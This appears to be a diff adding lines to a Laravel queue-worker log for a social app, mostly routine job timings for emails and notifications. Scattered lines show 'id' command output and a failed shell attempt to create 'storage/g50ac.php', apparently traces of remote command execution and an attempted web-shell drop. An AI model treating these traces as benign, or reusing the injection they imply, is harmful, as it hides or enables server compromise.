+  2026-01-20 21:25:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 21:25:36 App\Jobs\User\Views\RegisterResourceViews . 17.74ms DONE
+  2026-01-20 21:35:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 21:35:45 App\Jobs\User\Views\RegisterResourceViews . 16.29ms DONE
+  2026-01-20 21:39:38 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 21:39:38 Illuminate\Notifications\Notification ...... 4.18ms DONE
+  2026-01-20 22:00:49 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 22:00:49 App\Jobs\User\Views\RegisterResourceViews . 15.65ms DONE
+  2026-01-20 22:01:18 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+sh: 1: cannot create storage/g50ac.php: Directory nonexistent
+  2026-01-20 22:01:18 App\Jobs\User\Views\RegisterResourceViews . 24.71ms DONE
+  2026-01-20 22:14:32 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 22:14:32 App\Jobs\User\Views\RegisterResourceViews . 12.46ms DONE
+  2026-01-20 23:12:07 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 23:12:07 App\Jobs\User\Views\RegisterResourceViews . 17.42ms DONE
+  2026-01-20 23:22:48 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 23:22:48 App\Jobs\User\Views\RegisterResourceViews . 11.29ms DONE
+  2026-01-20 23:27:58 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 23:27:58 App\Jobs\User\Views\RegisterResourceViews . 13.25ms DONE
+  2026-01-20 23:28:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 23:28:26 App\Jobs\User\Views\RegisterResourceViews . 14.75ms DONE
+  2026-01-20 23:28:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 23:28:28 App\Jobs\User\Views\RegisterResourceViews .. 8.79ms DONE
+  2026-01-20 23:31:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 23:31:26 App\Jobs\User\Views\RegisterResourceViews . 11.26ms DONE
+  2026-01-20 23:32:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 23:32:56 App\Jobs\User\Views\RegisterResourceViews . 17.79ms DONE
+  2026-01-21 09:59:01 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 09:59:01 App\Jobs\User\Views\RegisterResourceViews . 21.10ms DONE
+  2026-01-21 12:53:34 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-21 12:53:35 App\Mail\User\Auth\VerifyEmailMail ............. 1s DONE
+  2026-01-21 13:09:57 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-21 13:09:57 App\Notifications\User\Follows\NewFollowerNotification  14.12ms DONE
+  2026-01-21 13:09:57 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-21 13:09:57 App\Notifications\User\Follows\NewFollowerNotification  11.80ms DONE
+  2026-01-21 13:09:57 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-21 13:09:57 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-21 13:09:57 Illuminate\Notifications\Events\BroadcastNotificationCreated  71.59ms DONE
+  2026-01-21 13:09:58 App\Notifications\User\Follows\NewFollowerNotification  708.14ms DONE
+  2026-01-21 13:10:42 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-21 13:10:42 App\Notifications\User\Post\PostReactedNotification  25.74ms DONE
+  2026-01-21 13:10:42 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-21 13:10:42 App\Notifications\User\Post\PostReactedNotification  13.28ms DONE
+  2026-01-21 13:10:42 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-21 13:10:43 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-21 13:10:43 Illuminate\Notifications\Events\BroadcastNotificationCreated  86.21ms DONE
+  2026-01-21 13:10:43 App\Notifications\User\Post\PostReactedNotification  722.64ms DONE
+  2026-01-21 13:10:58 App\Notifications\User\Post\PostCommentedNotification  RUNNING
+  2026-01-21 13:10:58 App\Notifications\User\Post\PostCommentedNotification  9.26ms DONE
+  2026-01-21 13:10:58 App\Notifications\User\Post\PostCommentedNotification  RUNNING
+  2026-01-21 13:10:58 App\Notifications\User\Post\PostCommentedNotification  20.00ms DONE
+  2026-01-21 13:10:58 App\Notifications\User\Post\PostCommentedNotification  RUNNING
+  2026-01-21 13:10:58 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-21 13:10:58 Illuminate\Notifications\Events\BroadcastNotificationCreated  11.49ms DONE
+  2026-01-21 13:10:58 App\Notifications\User\Post\PostCommentedNotification  666.42ms DONE
+  2026-01-21 13:48:39 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-21 13:48:58 App\Mail\User\Auth\VerifyEmailMail ............ 19s DONE
+  2026-01-21 13:52:11 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 13:52:11 App\Jobs\User\Views\RegisterResourceViews . 17.51ms DONE
+  2026-01-21 13:57:36 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-21 13:57:37 App\Mail\User\Auth\ResetPasswordMail ..... 736.66ms DONE
+  2026-01-21 13:58:44 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-21 13:58:44 App\Mail\User\Auth\ResetPasswordMail ..... 670.90ms DONE
+  2026-01-21 14:05:54 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-21 14:05:55 App\Mail\User\Auth\VerifyEmailMail ....... 804.74ms DONE
+  2026-01-21 14:08:37 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-21 14:08:38 App\Mail\User\Auth\ResetPasswordMail ........... 1s DONE
+  2026-01-21 15:09:14 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 15:09:14 App\Jobs\User\Views\RegisterResourceViews . 12.68ms DONE
+  2026-01-21 18:52:37 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 18:52:37 App\Jobs\User\Views\RegisterResourceViews . 18.27ms DONE
+  2026-01-21 19:28:46 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 19:28:46 App\Jobs\User\Views\RegisterResourceViews . 29.11ms DONE
+  2026-01-21 19:32:55 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 19:32:55 App\Jobs\User\Views\RegisterResourceViews . 11.19ms DONE
+  2026-01-21 19:54:25 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 19:54:25 App\Jobs\User\Views\RegisterResourceViews . 12.50ms DONE
+  2026-01-21 20:06:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 20:06:51 App\Jobs\User\Views\RegisterResourceViews .. 9.51ms DONE
+  2026-01-21 21:14:29 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 21:14:29 App\Jobs\User\Views\RegisterResourceViews . 10.57ms DONE
+  2026-01-21 21:14:53 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 21:14:53 App\Jobs\User\Views\RegisterResourceViews .. 9.83ms DONE
+  2026-01-21 21:14:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 21:14:56 App\Jobs\User\Views\RegisterResourceViews . 13.95ms DONE
+  2026-01-21 21:21:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 21:21:56 App\Jobs\User\Views\RegisterResourceViews . 12.12ms DONE
+  2026-01-21 21:22:30 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-21 21:22:30 App\Jobs\User\Views\RegisterResourceViews . 13.68ms DONE
+  2026-01-21 22:20:07 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-21 22:20:08 App\Mail\User\Auth\ResetPasswordMail ..... 740.88ms DONE
+  2026-01-22 00:54:47 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-22 00:54:47 App\Mail\User\Auth\VerifyEmailMail ....... 200.47ms DONE
+  2026-01-22 01:35:58 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-22 01:35:58 App\Jobs\User\Views\RegisterResourceViews . 18.61ms DONE
+  2026-01-22 01:36:22 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-22 01:36:22 App\Jobs\User\Views\RegisterResourceViews . 10.98ms DONE
+  2026-01-22 15:11:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-22 15:11:57 App\Jobs\User\Views\RegisterResourceViews . 16.45ms DONE
+  2026-01-22 23:32:09 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-22 23:32:10 App\Mail\User\Auth\VerifyEmailMail ....... 797.19ms DONE
+  2026-01-22 23:43:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-22 23:43:26 App\Jobs\User\Views\RegisterResourceViews . 16.50ms DONE
+  2026-01-22 23:49:47 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-22 23:49:47 App\Mail\User\Auth\VerifyEmailMail ....... 627.60ms DONE
+  2026-01-22 23:51:20 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-22 23:51:20 App\Jobs\User\Views\RegisterResourceViews . 13.85ms DONE
+  2026-01-22 23:51:41 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-22 23:51:41 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-22 23:51:41 App\Notifications\User\Follows\NewFollowerNotification  13.85ms DONE
+  2026-01-22 23:51:42 App\Notifications\User\Follows\NewFollowerNotification  733.65ms DONE
+  2026-01-22 23:56:33 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-22 23:56:33 App\Notifications\User\Post\PostReactedNotification  10.53ms DONE
+  2026-01-22 23:56:33 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-22 23:56:33 App\Notifications\User\Post\PostReactedNotification  14.16ms DONE
+  2026-01-22 23:56:33 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-22 23:56:34 App\Notifications\User\Post\PostReactedNotification  1s DONE
+  2026-01-23 00:33:35 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 00:33:36 App\Mail\User\Auth\VerifyEmailMail ....... 681.26ms DONE
+  2026-01-23 00:33:38 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 00:33:38 App\Mail\User\Auth\VerifyEmailMail ....... 658.91ms DONE
+  2026-01-23 00:36:12 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 00:36:13 App\Mail\User\Auth\VerifyEmailMail ............. 1s DONE
+  2026-01-23 00:52:23 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 00:52:24 App\Mail\User\Auth\VerifyEmailMail ....... 722.35ms DONE
+  2026-01-23 10:40:00 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 10:40:00 App\Jobs\User\Views\RegisterResourceViews . 18.64ms DONE
+  2026-01-23 15:09:55 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 15:09:55 App\Jobs\User\Views\RegisterResourceViews . 24.87ms DONE
+  2026-01-23 16:05:19 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 16:05:19 App\Jobs\User\Views\RegisterResourceViews . 16.65ms DONE
+  2026-01-23 16:24:47 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-23 16:24:47 Illuminate\Notifications\Notification ...... 3.58ms DONE
+  2026-01-23 16:24:50 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-23 16:24:50 Illuminate\Notifications\Notification ...... 4.02ms DONE
+  2026-01-23 17:09:29 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-23 17:09:29 App\Mail\User\Auth\VerifyEmailMail ....... 632.85ms DONE
+  2026-01-23 17:11:27 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:11:27 App\Jobs\User\Views\RegisterResourceViews . 15.44ms DONE
+  2026-01-23 17:12:00 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 17:12:00 App\Mail\User\Auth\VerifyEmailMail ....... 669.16ms DONE
+  2026-01-23 17:12:41 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 17:12:42 App\Mail\User\Auth\VerifyEmailMail ....... 737.16ms DONE
+  2026-01-23 17:13:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:13:51 App\Jobs\User\Views\RegisterResourceViews . 19.86ms DONE
+  2026-01-23 17:15:21 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:15:21 App\Jobs\User\Views\RegisterResourceViews . 20.69ms DONE
+  2026-01-23 17:16:16 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:16:16 App\Jobs\User\Views\RegisterResourceViews . 15.21ms DONE
+  2026-01-23 17:16:43 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 17:16:43 App\Mail\User\Auth\VerifyEmailMail ....... 679.53ms DONE
+  2026-01-23 17:19:45 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 17:19:45 App\Notifications\User\Follows\NewFollowerNotification  12.70ms DONE
+  2026-01-23 17:19:45 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 17:19:45 App\Notifications\User\Follows\NewFollowerNotification  25.03ms DONE
+  2026-01-23 17:19:45 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 17:19:46 App\Notifications\User\Follows\NewFollowerNotification  746.96ms DONE
+  2026-01-23 17:19:46 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-23 17:19:46 Illuminate\Notifications\Events\BroadcastNotificationCreated  65.76ms DONE
+  2026-01-23 17:20:34 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 17:20:35 App\Mail\User\Auth\VerifyEmailMail ....... 658.39ms DONE
+  2026-01-23 17:21:35 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 17:21:36 App\Mail\User\Auth\VerifyEmailMail ............. 1s DONE
+  2026-01-23 17:26:06 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:26:06 App\Jobs\User\Views\RegisterResourceViews . 17.68ms DONE
+  2026-01-23 17:30:39 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:30:39 App\Jobs\User\Views\RegisterResourceViews . 26.37ms DONE
+  2026-01-23 17:32:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:32:36 App\Jobs\User\Views\RegisterResourceViews . 22.19ms DONE
+  2026-01-23 17:48:27 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:48:27 App\Jobs\User\Views\RegisterResourceViews . 15.89ms DONE
+  2026-01-23 17:50:07 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 17:50:07 App\Jobs\User\Views\RegisterResourceViews . 14.06ms DONE
+  2026-01-23 17:50:53 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 17:50:53 App\Notifications\User\Follows\NewFollowerNotification  12.03ms DONE
+  2026-01-23 17:50:53 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 17:50:53 App\Notifications\User\Follows\NewFollowerNotification  11.59ms DONE
+  2026-01-23 17:50:53 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 17:50:54 App\Notifications\User\Follows\NewFollowerNotification  1s DONE
+  2026-01-23 19:07:55 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 19:07:55 App\Jobs\User\Views\RegisterResourceViews . 20.64ms DONE
+  2026-01-23 19:07:56 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 19:07:56 App\Notifications\User\Follows\NewFollowerNotification  9.67ms DONE
+  2026-01-23 19:07:56 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 19:07:56 App\Notifications\User\Follows\NewFollowerNotification  13.38ms DONE
+  2026-01-23 19:07:56 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 19:07:57 App\Notifications\User\Follows\NewFollowerNotification  692.30ms DONE
+  2026-01-23 19:07:57 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-23 19:07:57 Illuminate\Notifications\Events\BroadcastNotificationCreated  63.78ms DONE
+  2026-01-23 19:08:00 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 19:08:00 App\Jobs\User\Views\RegisterResourceViews . 19.20ms DONE
+  2026-01-23 19:41:24 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 19:41:25 App\Mail\User\Auth\VerifyEmailMail ....... 743.37ms DONE
+  2026-01-23 21:06:15 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:06:15 App\Jobs\User\Views\RegisterResourceViews . 16.22ms DONE
+  2026-01-23 21:10:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:10:45 App\Jobs\User\Views\RegisterResourceViews . 17.78ms DONE
+  2026-01-23 21:18:43 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:18:43 App\Jobs\User\Views\RegisterResourceViews . 11.48ms DONE
+  2026-01-23 21:20:54 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:20:54 App\Jobs\User\Views\RegisterResourceViews . 16.07ms DONE
+  2026-01-23 21:21:06 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:21:06 App\Jobs\User\Views\RegisterResourceViews . 12.34ms DONE
+  2026-01-23 21:23:37 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:23:37 App\Jobs\User\Views\RegisterResourceViews . 13.98ms DONE
+  2026-01-23 21:24:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:24:04 App\Jobs\User\Views\RegisterResourceViews . 12.79ms DONE
+  2026-01-23 21:25:16 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:25:16 App\Jobs\User\Views\RegisterResourceViews . 11.32ms DONE
+  2026-01-23 21:41:11 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:41:11 App\Jobs\User\Views\RegisterResourceViews . 12.79ms DONE
+  2026-01-23 21:43:20 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:43:20 App\Jobs\User\Views\RegisterResourceViews . 29.06ms DONE
+  2026-01-23 21:48:35 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:48:35 App\Jobs\User\Views\RegisterResourceViews . 16.99ms DONE
+  2026-01-23 21:56:47 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 21:56:48 App\Mail\User\Auth\VerifyEmailMail ....... 717.27ms DONE
+  2026-01-23 21:57:30 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 21:57:30 App\Jobs\User\Views\RegisterResourceViews . 14.54ms DONE
+  2026-01-23 22:14:10 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-23 22:14:10 App\Mail\User\Auth\ResetPasswordMail ..... 686.36ms DONE
+  2026-01-23 22:14:19 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:14:19 App\Jobs\User\Views\RegisterResourceViews . 14.87ms DONE
+  2026-01-23 22:20:41 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:20:41 App\Jobs\User\Views\RegisterResourceViews . 16.17ms DONE
+  2026-01-23 22:22:05 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:22:05 App\Jobs\User\Views\RegisterResourceViews . 18.52ms DONE
+  2026-01-23 22:22:35 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:22:35 App\Jobs\User\Views\RegisterResourceViews . 11.89ms DONE
+  2026-01-23 22:29:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:29:04 App\Jobs\User\Views\RegisterResourceViews . 15.73ms DONE
+  2026-01-23 22:31:20 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:31:20 App\Jobs\User\Views\RegisterResourceViews . 10.94ms DONE
+  2026-01-23 22:32:59 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-23 22:32:59 App\Notifications\User\Wallet\PaymentReceivedNotification  16.72ms DONE
+  2026-01-23 22:32:59 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-23 22:33:00 App\Notifications\User\Wallet\PaymentReceivedNotification  663.44ms DONE
+  2026-01-23 22:33:00 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-23 22:33:00 App\Notifications\User\Wallet\PaymentReceivedNotification  14.72ms DONE
+  2026-01-23 22:33:00 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-23 22:33:00 Illuminate\Notifications\Events\BroadcastNotificationCreated  46.43ms DONE
+  2026-01-23 22:33:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:33:24 App\Jobs\User\Views\RegisterResourceViews . 12.49ms DONE
+  2026-01-23 22:34:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:34:51 App\Jobs\User\Views\RegisterResourceViews .. 9.16ms DONE
+  2026-01-23 22:37:29 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-23 22:37:29 App\Notifications\User\Chat\MessageReceivedNotification  5.80ms DONE
+  2026-01-23 22:37:29 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-23 22:37:29 Illuminate\Notifications\Events\BroadcastNotificationCreated  47.01ms DONE
+  2026-01-23 22:37:59 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-23 22:37:59 App\Notifications\User\Wallet\PaymentReceivedNotification  17.74ms DONE
+  2026-01-23 22:37:59 App\Notifications\User\Wallet\PaymentReceivedNotification  RUNNING
+  2026-01-23 22:38:00 App\Notifications\User\Wallet\PaymentReceivedNotification  700.09ms DONE
+  2026-01-23 22:43:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:43:24 App\Jobs\User\Views\RegisterResourceViews .. 8.88ms DONE
+  2026-01-23 22:46:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:46:51 App\Jobs\User\Views\RegisterResourceViews . 10.79ms DONE
+  2026-01-23 22:50:43 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-23 22:50:43 App\Mail\User\Auth\VerifyEmailMail ....... 711.90ms DONE
+  2026-01-23 22:54:00 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:54:00 App\Jobs\User\Views\RegisterResourceViews . 10.79ms DONE
+  2026-01-23 22:54:01 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 22:54:01 App\Jobs\User\Views\RegisterResourceViews . 13.41ms DONE
+  2026-01-23 23:06:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:06:28 App\Jobs\User\Views\RegisterResourceViews . 16.71ms DONE
+  2026-01-23 23:10:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:10:10 App\Jobs\User\Views\RegisterResourceViews .. 9.29ms DONE
+  2026-01-23 23:15:40 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-23 23:15:41 App\Mail\User\Auth\ResetPasswordMail ..... 717.97ms DONE
+  2026-01-23 23:15:53 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-23 23:15:53 App\Mail\User\Auth\ResetPasswordMail ..... 612.74ms DONE
+  2026-01-23 23:19:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:19:03 App\Jobs\User\Views\RegisterResourceViews . 11.20ms DONE
+  2026-01-23 23:26:27 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 23:26:27 App\Notifications\User\Follows\NewFollowerNotification  7.34ms DONE
+  2026-01-23 23:26:27 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 23:26:27 App\Notifications\User\Follows\NewFollowerNotification  9.19ms DONE
+  2026-01-23 23:26:27 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-23 23:26:28 App\Notifications\User\Follows\NewFollowerNotification  663.68ms DONE
+  2026-01-23 23:26:28 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-23 23:26:28 Illuminate\Notifications\Events\BroadcastNotificationCreated  47.63ms DONE
+  2026-01-23 23:29:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:29:10 App\Jobs\User\Views\RegisterResourceViews . 16.64ms DONE
+  2026-01-23 23:32:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:32:10 App\Jobs\User\Views\RegisterResourceViews . 10.41ms DONE
+  2026-01-23 23:32:15 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:32:15 App\Jobs\User\Views\RegisterResourceViews . 13.85ms DONE
+  2026-01-23 23:32:39 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:32:39 App\Jobs\User\Views\RegisterResourceViews .. 8.65ms DONE
+  2026-01-23 23:40:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:40:10 App\Jobs\User\Views\RegisterResourceViews . 11.96ms DONE
+  2026-01-23 23:46:27 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-23 23:46:28 App\Mail\User\Auth\ResetPasswordMail ..... 687.17ms DONE
+  2026-01-23 23:57:20 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-23 23:57:20 App\Mail\User\Auth\ResetPasswordMail ..... 669.34ms DONE
+  2026-01-23 23:58:41 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-23 23:58:41 App\Jobs\User\Views\RegisterResourceViews . 12.18ms DONE
+  2026-01-24 00:01:14 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:01:14 App\Jobs\User\Views\RegisterResourceViews . 12.07ms DONE
+  2026-01-24 00:02:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:02:26 App\Jobs\User\Views\RegisterResourceViews . 10.24ms DONE
+  2026-01-24 00:09:05 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:09:05 App\Jobs\User\Views\RegisterResourceViews . 13.23ms DONE
+  2026-01-24 00:09:29 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:09:29 App\Jobs\User\Views\RegisterResourceViews . 10.10ms DONE
+  2026-01-24 00:09:38 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:09:38 App\Jobs\User\Views\RegisterResourceViews . 10.99ms DONE
+  2026-01-24 00:10:11 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:10:11 App\Jobs\User\Views\RegisterResourceViews . 10.39ms DONE
+  2026-01-24 00:18:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:18:45 App\Jobs\User\Views\RegisterResourceViews . 14.66ms DONE
+  2026-01-24 00:22:09 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:22:09 App\Jobs\User\Views\RegisterResourceViews . 11.57ms DONE
+  2026-01-24 00:25:09 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-24 00:25:09 App\Jobs\User\Views\RegisterResourceViews .. 8.53ms DONE
+  2026-01-24 00:26:36 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-24 00:26:36 Illuminate\Notifications\Events\BroadcastNotificationCreated  47.43ms DONE
+  2026-01-24 00:26:51 App\Notifications\User\Post\CommentReactedNotification  RUNNING
+  2026-01-24 00:26:51 App\Notifications\User\Post\CommentReactedNotification  11.27ms DONE
+  2026-01-24 00:26:51 App\Notifications\User\Post\CommentReactedNotification  RUNNING
+  2026-01-24 00:26:51 App\Notifications\User\Post\CommentReactedNotification  16.49ms DONE
+  2026-01-24 00:26:51 App\Notifications\User\Post\CommentReactedNotification  RUNNING
+  2026-01-24 00:26:52 App\Notifications\User\Post\CommentReactedNotification  677.75ms DONE
